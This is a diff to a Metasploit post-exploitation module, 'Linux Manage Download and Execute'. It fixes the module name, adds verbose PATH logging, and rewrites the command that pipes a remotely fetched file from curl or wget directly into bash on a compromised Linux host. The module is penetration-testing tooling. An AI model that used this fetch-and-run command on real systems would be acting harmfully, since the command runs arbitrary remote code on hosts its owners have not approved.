@@ -13,7 +13,7 @@ class Metasploit3 < Msf::Post
 
   def initialize(info={})
     super( update_info( info,
-      'Name'          => 'Linux Manage Download and Exececute',
+      'Name'          => 'Linux Manage Download and Execute',
       'Description'   => %q{
           This module downloads and runs a file with bash. It first tries to uses curl as
         its HTTP client and then wget if it's not found. Bash found in the PATH is used to
@@ -45,13 +45,19 @@ class Metasploit3 < Msf::Post
   end
 
   def exists_exe?(exe)
-    path = expand_path(ENV['PATH'])
+    vprint_status "Searching for #{exe} in the current $PATH..."
+    path = get_env("PATH")
     if path.nil? or path.empty?
       return false
+      vprint_error "No local $PATH set!"
+    else
+      vprint_status "$PATH is #{path.strip!}"
     end
 
     path.split(":").each{ |p|
-      return true if file_exist?(p + "/" + exe)
+      full_path = p + "/" + exe
+      vprint_status "Searching for '#{full_path}' ..."
+      return true if file_exist?(full_path)
     }
 
     return false
@@ -108,10 +114,10 @@ class Metasploit3 < Msf::Post
       return
     end
 
-    if datastore['URL'].match(/https/)
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+    if datastore['URL'].match(%r{^https://})
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{@ssl_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     else
-      cmd_exec_vprint("`which #{@http_client}` #{@stdout_option} #{datastore['URL']} 2>/dev/null | `which #{@shell}` ")
+      cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
 
